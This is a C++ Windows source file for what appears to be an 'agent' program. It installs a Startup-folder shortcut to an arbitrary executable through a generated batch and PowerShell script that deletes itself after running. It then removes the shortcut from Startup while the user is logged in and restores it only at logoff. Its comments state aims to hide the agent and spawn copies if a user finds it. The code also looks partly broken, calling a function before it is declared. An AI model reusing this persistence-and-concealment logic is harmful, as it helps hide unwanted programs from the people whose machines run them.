#include <iostream>
#include <conio.h>
#include <string>
#include <windows.h>
#include <fstream>
#include <shellapi.h>
#include <stdio.h>
#include <direct.h>
#include <Shlobj.h>



using namespace std;

/*RUN COMMAND LINE or .bat file and get output, this blocks thread

string command = "f";
command += sourceExe;
command += "calc & notepad"; // &: run two command, &&: run if before command done
char *cmd = string_to_charstar(command);
char *output = string_to_charstar(exec(cmd));
*/


/*RUN POWERSHELL COMMAND or .bat file (can't get output), does not block thread

// When using char strings
ShellExecuteA(NULL, "open", "calc", NULL, NULL, SW_SHOW);
// When using wchar_t strings
ShellExecuteW(NULL, L"open", L"http://www.cplusplus.com/", NULL, NULL, SW_SHOW);
// When you aren't sure
ShellExecute(NULL, TEXT("open"), TEXT("calc"), NULL, NULL, SW_SHOW);
ex:
int nRet = (int)ShellExecuteA(NULL, "open", "a.bat", NULL, NULL, SW_SHOW);
if (nRet > 32) {
//OK
//cout << "OK";
}
else {
//error
}
*/

#define MAX_PATH 32767
#define MODE_YAZID

LPWSTR *szArglist;
string startupPath = "C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\mainprocess.lnk"; //will change
string shortcutName = "mainprocess.lnk";

char* string_to_charstar(string str) {

	char *cstr = new char[str.length() + 1];
	strcpy(cstr, str.c_str()); //c_str() returns const char *
	return cstr;
}

string exec(const char* cmd) {
	char buffer[128];
	std::string result = "";
	FILE* pipe = _popen(cmd, "r");
	if (!pipe) throw std::runtime_error("popen() failed!");
	try {
		while (!feof(pipe)) {
			if (fgets(buffer, 128, pipe) != NULL)
				result += buffer;
		}
	}
	catch (...) {
		_pclose(pipe);
		throw;
	}
	_pclose(pipe);
	return result;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

/*
int main(int argc, char* argv[]) {


	//TODO copy agent.exe in ProgramData then link to it
	//TODO hide agent.exe
	//TODO if user find agent as sturtup can fined all files so agent must run another agent in another path

	//arg[0] is filepath (C:\Temp\filename.exe)
	//arg[1] is mode

	if (argc == 3) {

		const char *fileLocation = argv[1];
		string sourceExe(fileLocation); //char* to string

		if (argv[2][0] == '1') {

		}
		else if (argv[2][0] == '2') {

		}
	}
	_getch();
	return 0;
}
*/

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR pCmdLine, int nCmdShow)
{
	// Register the window class.
	const wchar_t CLASS_NAME[] = L"Sample Window Class";
	WNDCLASS wc = {};
	wc.lpfnWndProc = WindowProc;
	wc.hInstance = hInstance;
	wc.lpszClassName = CLASS_NAME;
	RegisterClass(&wc);
	// Create the window.
	HWND hwnd = CreateWindowEx(
		0,                              // Optional window styles.
		CLASS_NAME,                     // Window class
		L"Learn to Program Windows",    // Window text
		WS_OVERLAPPEDWINDOW,            // Window style
										// Size and position
		CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
		NULL,       // Parent window    
		NULL,       // Menu
		hInstance,  // Instance handle
		NULL        // Additional application data
	);
	if (hwnd == NULL)
	{
		return 0;
	}




	// get args from cmd
	int nArgs;
	int i;
	szArglist = CommandLineToArgvW(GetCommandLineW(), &nArgs);
	if (NULL == szArglist)
	{
		wprintf(L"CommandLineToArgvW failed\n");
		return 0;
	}
	else {
		//for (i = 0; i < nArgs; i++) printf("%d: %ws\n", i, szArglist[i]);
	}


	system("notepad");

	if (nArgs == 3) {

		//get user folder
		WCHAR p[MAX_PATH];
		if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, p))) {
			char *name = (char *)malloc(MAX_PATH);
			wcstombs(name, p, MAX_PATH);
			string userpath(name);
			string usertillsturtup = "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
			startupPath = userpath;
			startupPath += usertillsturtup;
			startupPath += shortcutName;
		}


		char *fileLocation = (char *)malloc(MAX_PATH);
		wcstombs(fileLocation, szArglist[1], MAX_PATH);
		string sourceExe(fileLocation);

		char *mode = (char *)malloc(5);
		wcstombs(mode, szArglist[2], 5);

		if (mode[0] == '1') {

			ofstream myfile;
			myfile.open("t.bat");
			myfile << "@echo off\n"
				"Powershell.exe -executionpolicy remotesigned -File  tt.ps1\n"
				//"set /p temp = \"Hit enter to continue\"\n"  //for dont close cmd
				"exit / b"
				;
			myfile.close();

			myfile.open("tt.ps1");
			myfile <<
				"$SourceExe = \""
				<< sourceExe <<
				"\"\n"
				"$DestinationPath = \""
				<< startupPath <<
				"\"\n"
				"$WshShell = New-Object -comObject WScript.Shell\n"
				"$Shortcut = $WshShell.CreateShortcut($DestinationPath)\n"
				"$Shortcut.TargetPath = $SourceExe\n"
				"$Shortcut.Save()"
				;
			myfile.close();

			
			exec("t.bat"); 
			remove("t.bat");
			remove("tt.ps1");
			/*
			int nRet = (int)ShellExecuteA(NULL, "open", "t.bat", NULL, NULL, SW_SHOW);
			if (nRet > 32) {
				//OK
				//cout << "OK";
				//remove("t.bat");
				//remove("tt.ps1");
				//cout << "1 done.";
			}
			else {
				//error
				//cout << "1 failed.";
			}
			*/

		}
	}

	
	
	// Free memory allocated for CommandLineToArgvW arguments.
	LocalFree(szArglist);

#ifdef MODE_YAZID

	copy_shortcut();

	remove(string_to_charstar(startupPath));

#endif




	// Run the message loop.
	MSG msg = {};
	while (GetMessage(&msg, NULL, 0, 0)) //pull a message
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}

void copy_shortcut() {
	//make a sub folder
	char outDir[MAX_PATH] = "C:\\ProgramData\\temp";
	_mkdir(outDir);
	ifstream check;
	check.open(startupPath);
	if (check.good()) {
		check.close();
		ifstream src(startupPath, ios::binary);
		ofstream des("C:\\ProgramData\\temp\\mainprocess.lnk", ios::binary);

		//copy
		while (!src.eof()) {
			des.put(src.get());
		}
		src.close();
		des.close();
	}
}

void restore_shortcut() {
	ifstream check;
	check.open("C:\\ProgramData\\temp\\mainprocess.lnk");
	if (check.good()) {
		check.close();
		ofstream des(startupPath, ios::binary);
		ifstream src("C:\\ProgramData\\temp\\mainprocess.lnk", ios::binary);

		//copy
		while (!src.eof()) {
			des.put(src.get());
		}
		src.close();
		des.close();
	}
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uMsg)
	{
		case WM_DESTROY:
			PostQuitMessage(0);
			return 0;

		case WM_PAINT:
			return 0;

		case WM_QUERYENDSESSION: //when logging off
		{
			
			
			#ifdef MODE_YAZID

			restore_shortcut();

			#endif

			
			return true;
		}

	}
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}